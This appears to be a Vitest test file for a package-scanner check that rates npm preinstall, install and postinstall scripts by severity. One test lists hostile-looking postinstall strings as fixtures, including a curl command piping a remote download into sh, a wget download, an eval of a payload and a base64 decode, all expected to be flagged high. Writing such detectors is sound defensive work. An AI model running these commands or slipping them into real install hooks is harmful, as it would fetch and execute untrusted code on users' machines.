import { describe, expect, it } from 'vitest';

import { checkInstallScripts } from '../src/checks/install-scripts.js';
import type { RegistryVersion } from '../src/registry.js';

const version = (scripts?: Record<string, string>, optionalDependencies?: Record<string, string>): RegistryVersion => ({
    name: 'fixture',
    version: '1.0.0',
    ...(scripts ? { scripts } : {}),
    ...(optionalDependencies ? { optionalDependencies } : {}),
});

describe('checkInstallScripts', () => {
    it('ignores unrelated scripts', () => {
        expect(checkInstallScripts(version({ test: 'vitest' }), {})).toEqual([]);
    });

    it('rates an ordinary lifecycle script medium and includes its text', () => {
        expect(checkInstallScripts(version({ install: 'node-gyp rebuild' }), {})).toEqual([
            expect.objectContaining({
                check: 'installScripts',
                severity: 'medium',
                detail: 'install: node-gyp rebuild',
            }),
        ]);
    });

    it('rates harmless inline Node.js lifecycle code medium', () => {
        const script = 'node -e "try{require(\'./postinstall\')}catch(e){}"';
        expect(checkInstallScripts(version({ postinstall: script }), {})[0]).toMatchObject({
            severity: 'medium',
            detail: `postinstall: ${script}`,
        });
    });

    it('rates a platform-binary installer high', () => {
        expect(checkInstallScripts(version(
            { postinstall: 'node install.js' },
            { '@vendor/linux-x64': '1.0.0', '@vendor/darwin-arm64': '1.0.0' },
        ), {})[0]).toMatchObject({
            severity: 'high',
            summary: 'postinstall installs a platform-specific binary',
        });
    });

    it.each([
        'curl -sL https://example.test/bin | sh',
        'wget https://example.test/bin',
        'node -e "eval(payload)"',
        'echo eA== | base64 -d',
    ])('rates suspicious postinstall content high: %s', (script) => {
        expect(checkInstallScripts(version({ postinstall: script }), {})[0]).toMatchObject({
            check: 'installScripts',
            severity: 'high',
            detail: `postinstall: ${script}`,
        });
    });

    it('inspects preinstall, install, and postinstall', () => {
        expect(checkInstallScripts(version({ preinstall: 'echo pre', install: 'echo install', postinstall: 'echo post' }), {})).toHaveLength(3);
    });
});
